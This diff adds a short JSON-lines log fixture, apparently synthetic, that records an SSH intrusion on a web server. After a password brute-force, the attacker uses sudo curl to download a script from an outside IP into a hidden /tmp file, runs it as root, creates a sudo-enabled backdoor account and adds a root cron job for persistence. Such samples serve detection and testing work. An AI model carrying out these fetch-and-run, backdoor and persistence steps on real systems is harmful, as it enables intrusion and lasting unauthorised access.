@@ -1,0 +1,10 @@
+{"@timestamp": "2026-09-15T18:04:58.000Z", "host": "web-01", "program": "sshd", "user": "deploy", "message": "Failed password for deploy from 203.0.113.77 port 51410 ssh2"}
+{"@timestamp": "2026-09-15T18:05:03.000Z", "host": "web-01", "program": "sshd", "user": "deploy", "message": "Failed password for deploy from 203.0.113.77 port 51415 ssh2"}
+{"@timestamp": "2026-09-15T18:05:11.000Z", "host": "web-01", "program": "sshd", "user": "deploy", "message": "Accepted password for deploy from 203.0.113.77 port 51422 ssh2"}
+{"@timestamp": "2026-09-15T18:05:11.250Z", "host": "web-01", "program": "sshd", "user": "deploy", "message": "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)"}
+{"@timestamp": "2026-09-15T18:06:40.000Z", "host": "web-01", "program": "sudo", "user": "deploy", "message": "deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -fsSL http://198.51.100.23/setup.sh -o /tmp/.s"}
+{"@timestamp": "2026-09-15T18:06:41.000Z", "host": "web-01", "program": "sudo", "user": "deploy", "message": "deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash /tmp/.s"}
+{"@timestamp": "2026-09-15T18:06:45.000Z", "host": "web-01", "program": "useradd", "user": "root", "message": "new user: name=sysadm, UID=1002, GID=1002, home=/home/sysadm, shell=/bin/bash"}
+{"@timestamp": "2026-09-15T18:06:46.000Z", "host": "web-01", "program": "usermod", "user": "root", "message": "add 'sysadm' to group 'sudo'"}
+{"@timestamp": "2026-09-15T18:07:02.000Z", "host": "web-01", "program": "CRON", "user": "root", "message": "(root) CMD (/tmp/.s >/dev/null 2>&1)"}
+{"@timestamp": "2026-09-15T18:09:30.000Z", "host": "web-01", "program": "sshd", "user": "deploy", "message": "Received disconnect from 203.0.113.77 port 51422:11: disconnected by user"}
